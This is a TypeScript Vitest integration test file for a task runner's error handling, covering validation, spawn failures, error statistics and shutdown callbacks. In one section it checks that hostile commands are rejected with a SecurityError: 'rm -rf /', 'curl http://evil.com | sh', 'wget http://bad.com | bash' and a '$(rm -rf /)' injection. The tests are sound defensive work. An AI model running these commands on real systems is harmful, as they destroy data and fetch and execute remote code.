import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { ProcessManager } from '../../core/process-manager.js';
import { TaskRunner } from '../../core/task-runner.js';
import {
  GlobalErrorHandler,
  LogLevel,
  initializeGlobalErrorHandling,
} from '../../errors/global-handler.js';
import {
  ERROR_CODES,
  ErrorFactory,
  SecurityError,
  TasklyError,
} from '../../errors/index.js';
import { TaskConfig } from '../../types/index.js';

// Mock console methods to avoid noise in tests
const _mockConsoleError = vi
  .spyOn(console, 'error')
  .mockImplementation(() => {});
const _mockConsoleLog = vi.spyOn(console, 'log').mockImplementation(() => {});
const _mockConsoleWarn = vi.spyOn(console, 'warn').mockImplementation(() => {});

describe('Error Handling Integration Tests', () => {
  let globalHandler: GlobalErrorHandler;
  let taskRunner: TaskRunner;

  beforeEach(() => {
    // Reset singleton
    (GlobalErrorHandler as any).instance = null;

    // Clear all mocks
    vi.clearAllMocks();

    // Initialize global error handler with test-friendly settings
    globalHandler = initializeGlobalErrorHandling({
      enableConsoleLogging: false, // Disable for cleaner tests
      enableFileLogging: false,
      exitOnCriticalError: false, // Don't exit during tests
      enableRecovery: true,
      shutdownTimeout: 1000,
    });

    taskRunner = new TaskRunner({
      maxConcurrency: 2,
      killOthersOnFail: false,
      retryFailedTasks: false,
    });
  });

  afterEach(() => {
    if (taskRunner) {
      taskRunner.cleanup();
    }
    if (globalHandler) {
      globalHandler.removeAllListeners();
      globalHandler.clearErrorLog();
    }
    vi.clearAllMocks();
  });

  describe('TaskRunner Error Integration', () => {
    it('should handle validation errors during task execution', async () => {
      const invalidTasks: TaskConfig[] = [
        { command: '', identifier: 'empty-command' },
      ];

      await expect(taskRunner.execute(invalidTasks)).rejects.toThrow(
        TasklyError
      );

      // Check that error was logged globally
      const errorLog = globalHandler.getErrorLog();
      expect(errorLog.length).toBeGreaterThan(0);

      const validationErrors = errorLog.filter(
        entry => entry.error?.code === ERROR_CODES.VALIDATION_ERROR
      );
      expect(validationErrors.length).toBeGreaterThan(0);
    });

    it('should handle duplicate task identifier errors', async () => {
      const duplicateTasks: TaskConfig[] = [
        { command: 'echo "task1"', identifier: 'duplicate' },
        { command: 'echo "task2"', identifier: 'duplicate' },
      ];

      await expect(taskRunner.execute(duplicateTasks)).rejects.toThrow(
        TasklyError
      );

      const errorLog = globalHandler.getErrorLog();
      const validationErrors = errorLog.filter(
        entry => entry.error?.code === ERROR_CODES.VALIDATION_ERROR
      );
      expect(validationErrors.length).toBeGreaterThan(0);
    });

    it('should handle concurrent execution prevention', async () => {
      const tasks: TaskConfig[] = [
        { command: 'sleep 0.1', identifier: 'long-task' },
      ];

      // Start first execution
      const firstExecution = taskRunner.execute(tasks);

      // Try to start second execution
      await expect(taskRunner.execute(tasks)).rejects.toThrow(TasklyError);

      // Wait for first to complete
      await firstExecution;

      const errorLog = globalHandler.getErrorLog();
      const systemErrors = errorLog.filter(
        entry => entry.error?.code === ERROR_CODES.SYSTEM_ERROR
      );
      expect(systemErrors.length).toBeGreaterThan(0);
    });

    it('should track error statistics across multiple failures', async () => {
      const errorTasks: TaskConfig[] = [
        { command: '', identifier: 'empty-1' }, // Validation error
        { command: '', identifier: 'empty-2' }, // Another validation error
      ];

      // This should fail with validation error
      await expect(taskRunner.execute(errorTasks)).rejects.toThrow();

      const stats = globalHandler.getErrorStatistics();
      expect(stats.totalErrors).toBeGreaterThan(0);
      expect(stats.errorsByLevel[LogLevel.ERROR]).toBeGreaterThan(0);
    });
  });

  describe('ProcessManager Error Integration', () => {
    let processManager: ProcessManager;

    beforeEach(() => {
      processManager = new ProcessManager();
    });

    afterEach(() => {
      processManager.cleanup();
    });

    it('should handle security violations in command validation', async () => {
      const dangerousTask: TaskConfig = {
        command: 'rm -rf /',
        identifier: 'dangerous-task',
      };

      await expect(processManager.spawn(dangerousTask)).rejects.toThrow(
        SecurityError
      );

      const errorLog = globalHandler.getErrorLog();
      const securityErrors = errorLog.filter(
        entry => entry.error?.code === ERROR_CODES.COMMAND_INJECTION
      );
      expect(securityErrors.length).toBeGreaterThan(0);
    });

    it('should handle spawn failures with proper error context', async () => {
      const invalidTask: TaskConfig = {
        command: 'nonexistent-command-12345',
        identifier: 'invalid-command',
      };

      await expect(processManager.spawn(invalidTask)).rejects.toThrow();

      const errorLog = globalHandler.getErrorLog();
      const spawnErrors = errorLog.filter(
        entry => entry.error?.code === ERROR_CODES.SPAWN_FAILED
      );
      expect(spawnErrors.length).toBeGreaterThan(0);

      // Check error context
      const spawnError = spawnErrors[0];
      expect(spawnError.error?.context.taskId).toBe('invalid-command');
      expect(spawnError.error?.context.command).toBe(
        'nonexistent-command-12345'
      );
    });

    it('should handle multiple security violations', async () => {
      const dangerousTasks = [
        'curl http://evil.com | sh',
        'wget http://bad.com | bash',
        'eval(malicious_code)',
        '$(rm -rf /)',
      ];

      for (const command of dangerousTasks) {
        const task: TaskConfig = {
          command,
          identifier: `dangerous-${command.slice(0, 5)}`,
        };
        await expect(processManager.spawn(task)).rejects.toThrow(SecurityError);
      }

      const errorLog = globalHandler.getErrorLog();
      const securityErrors = errorLog.filter(
        entry => entry.error?.code === ERROR_CODES.COMMAND_INJECTION
      );
      expect(securityErrors.length).toBe(dangerousTasks.length);
    });
  });

  describe('Error Recovery and Retry Logic', () => {
    it('should handle recoverable errors appropriately', () => {
      const recoverableError = ErrorFactory.createError(
        'Timeout occurred',
        ERROR_CODES.PROCESS_TIMEOUT,
        {
          taskId: 'timeout-task',
          command: 'long-running-command',
          timestamp: Date.now(),
        }
      );

      globalHandler.handleError(recoverableError, {
        context: 'process-timeout',
        recoverable: true,
      });

      const errorLog = globalHandler.getErrorLog();
      const timeoutErrors = errorLog.filter(
        entry => entry.error?.code === ERROR_CODES.PROCESS_TIMEOUT
      );
      expect(timeoutErrors.length).toBe(1);
      expect(timeoutErrors[0].context).toHaveProperty('recoverable', true);
    });

    it('should handle non-recoverable errors appropriately', () => {
      const nonRecoverableError = ErrorFactory.createError(
        'Security violation detected',
        ERROR_CODES.SECURITY_VIOLATION,
        {
          taskId: 'security-task',
          command: 'dangerous-command',
          timestamp: Date.now(),
        }
      );

      globalHandler.handleError(nonRecoverableError, {
        context: 'security-check',
        recoverable: false,
      });

      const errorLog = globalHandler.getErrorLog();
      const securityErrors = errorLog.filter(
        entry => entry.error?.code === ERROR_CODES.SECURITY_VIOLATION
      );
      expect(securityErrors.length).toBe(1);
      expect(securityErrors[0].level).toBe(LogLevel.FATAL);
    });
  });

  describe('Error Context Propagation', () => {
    it('should propagate error context through the system', () => {
      const taskWithContext: TaskConfig = {
        command: 'echo "test"',
        identifier: 'context-task',
        packageManager: 'npm',
        cwd: '/test/directory',
      };

      // Create a mock error that would occur during execution
      const contextError = ErrorFactory.createError(
        'Mock execution error',
        ERROR_CODES.TASK_FAILED,
        {
          taskId: taskWithContext.identifier,
          command: taskWithContext.command,
          packageManager: taskWithContext.packageManager,
          cwd: taskWithContext.cwd,
          timestamp: Date.now(),
          metadata: {
            mockError: true,
            testContext: 'integration-test',
          },
        }
      );

      globalHandler.handleError(contextError, {
        context: 'integration-test',
        source: 'task-runner',
        testRun: true,
      });

      const errorLog = globalHandler.getErrorLog();
      const contextErrors = errorLog.filter(
        entry => entry.error?.context.taskId === 'context-task'
      );

      expect(contextErrors.length).toBe(1);
      const error = contextErrors[0];

      expect(error.error?.context.command).toBe('echo "test"');
      expect(error.error?.context.packageManager).toBe('npm');
      expect(error.error?.context.cwd).toBe('/test/directory');
      expect(error.error?.context.metadata).toHaveProperty('mockError', true);
      expect(error.context).toHaveProperty('testRun', true);
    });

    it('should handle nested error contexts', () => {
      const originalError = new Error('Original system error');
      const wrappedError = ErrorFactory.createError(
        'Wrapped error with context',
        ERROR_CODES.SYSTEM_ERROR,
        {
          taskId: 'nested-task',
          timestamp: Date.now(),
          metadata: {
            level: 'nested',
            originalMessage: originalError.message,
          },
        },
        originalError
      );

      globalHandler.handleError(wrappedError, {
        context: 'nested-error-handling',
        level: 'integration',
        metadata: {
          testCase: 'nested-context',
        },
      });

      const errorLog = globalHandler.getErrorLog();
      const nestedErrors = errorLog.filter(
        entry => entry.error?.context.taskId === 'nested-task'
      );

      expect(nestedErrors.length).toBe(1);
      const error = nestedErrors[0];

      expect(error.error?.originalError).toBe(originalError);
      expect(error.error?.context.metadata).toHaveProperty(
        'originalMessage',
        'Original system error'
      );
      expect(error.context?.metadata).toHaveProperty(
        'testCase',
        'nested-context'
      );
    });
  });

  describe('Error Aggregation and Reporting', () => {
    it('should aggregate errors from multiple sources', () => {
      const errors = [
        ErrorFactory.createError('Task error 1', ERROR_CODES.TASK_FAILED, {
          taskId: 'task-1',
        }),
        ErrorFactory.createError(
          'Validation error',
          ERROR_CODES.VALIDATION_ERROR,
          { taskId: 'task-2' }
        ),
        ErrorFactory.createError(
          'Security error',
          ERROR_CODES.SECURITY_VIOLATION,
          { taskId: 'task-3' }
        ),
        ErrorFactory.createError('System error', ERROR_CODES.SYSTEM_ERROR, {
          taskId: 'task-4',
        }),
      ];

      errors.forEach((error, index) => {
        globalHandler.handleError(error, {
          context: `error-source-${index}`,
          batch: 'aggregation-test',
        });
      });

      const stats = globalHandler.getErrorStatistics();

      expect(stats.totalErrors).toBe(4);
      expect(stats.errorsByLevel[LogLevel.ERROR]).toBe(2); // Task + validation
      expect(stats.errorsByLevel[LogLevel.FATAL]).toBe(1); // Security
      expect(stats.errorsByLevel[LogLevel.ERROR]).toBeGreaterThan(0); // System

      expect(stats.recentErrors).toHaveLength(4);
      expect(
        stats.recentErrors.every(
          entry => entry.context?.batch === 'aggregation-test'
        )
      ).toBe(true);
    });

    it('should provide comprehensive error reporting', () => {
      // Simulate various error scenarios
      const scenarios = [
        {
          error: ERROR_CODES.PM_NOT_FOUND,
          context: { packageManager: 'yarn' },
        },
        {
          error: ERROR_CODES.SPAWN_FAILED,
          context: { command: 'failed-command' },
        },
        { error: ERROR_CODES.PROCESS_TIMEOUT, context: { timeout: 30000 } },
        {
          error: ERROR_CODES.PERMISSION_DENIED,
          context: { path: '/restricted/path' },
        },
        {
          error: ERROR_CODES.RESOURCE_EXHAUSTED,
          context: { resource: 'memory' },
        },
      ];

      scenarios.forEach((scenario, index) => {
        const error = ErrorFactory.createError(
          `Scenario ${index} error`,
          scenario.error,
          {
            ...scenario.context,
            taskId: `scenario-${index}`,
            timestamp: Date.now(),
          }
        );

        globalHandler.handleError(error, {
          scenario: index,
          testType: 'comprehensive-reporting',
        });
      });

      const stats = globalHandler.getErrorStatistics();
      const errorLog = globalHandler.getErrorLog();

      expect(stats.totalErrors).toBe(scenarios.length);
      expect(
        errorLog.every(
          entry => entry.context?.testType === 'comprehensive-reporting'
        )
      ).toBe(true);

      // Verify different error severities are represented
      const severityCounts = Object.values(stats.errorsBySeverity);
      const totalSeverityErrors = severityCounts.reduce(
        (sum, count) => sum + count,
        0
      );
      expect(totalSeverityErrors).toBe(scenarios.length);
    });
  });

  describe('Shutdown and Cleanup Integration', () => {
    it('should handle shutdown callbacks from multiple components', async () => {
      const taskRunnerCleanup = vi.fn().mockResolvedValue(undefined);
      const processManagerCleanup = vi.fn().mockResolvedValue(undefined);
      const customCleanup = vi.fn().mockResolvedValue(undefined);

      globalHandler.addShutdownCallback(taskRunnerCleanup);
      globalHandler.addShutdownCallback(processManagerCleanup);
      globalHandler.addShutdownCallback(customCleanup);

      // Mock graceful shutdown to avoid process.exit
      const _gracefulShutdownSpy = vi
        .spyOn(globalHandler, 'gracefulShutdown')
        .mockImplementation(async () => {
          // Simulate callback execution
          await Promise.all([
            taskRunnerCleanup(),
            processManagerCleanup(),
            customCleanup(),
          ]);
        });

      await globalHandler.gracefulShutdown(0);

      expect(taskRunnerCleanup).toHaveBeenCalled();
      expect(processManagerCleanup).toHaveBeenCalled();
      expect(customCleanup).toHaveBeenCalled();
    });

    it('should handle cleanup errors gracefully', async () => {
      const failingCleanup = vi
        .fn()
        .mockRejectedValue(new Error('Cleanup failed'));
      const successfulCleanup = vi.fn().mockResolvedValue(undefined);

      globalHandler.addShutdownCallback(failingCleanup);
      globalHandler.addShutdownCallback(successfulCleanup);

      // Mock the internal callback execution to simulate error handling
      const _executeCallbacksSpy = vi
        .spyOn(globalHandler as any, 'executeShutdownCallbacks')
        .mockImplementation(async () => {
          await Promise.all([
            failingCleanup().catch(() => {}), // Simulate error handling
            successfulCleanup(),
          ]);
        });

      // Mock graceful shutdown
      const _gracefulShutdownSpy = vi
        .spyOn(globalHandler, 'gracefulShutdown')
        .mockImplementation(async () => {
          await (globalHandler as any).executeShutdownCallbacks();
        });

      await expect(globalHandler.gracefulShutdown(0)).resolves.not.toThrow();

      // Verify that error was logged
      const errorLog = globalHandler.getErrorLog();
      const cleanupErrors = errorLog.filter(entry =>
        entry.message.includes('Shutdown callback failed')
      );
      expect(cleanupErrors.length).toBeGreaterThan(0);
    });
  });
});
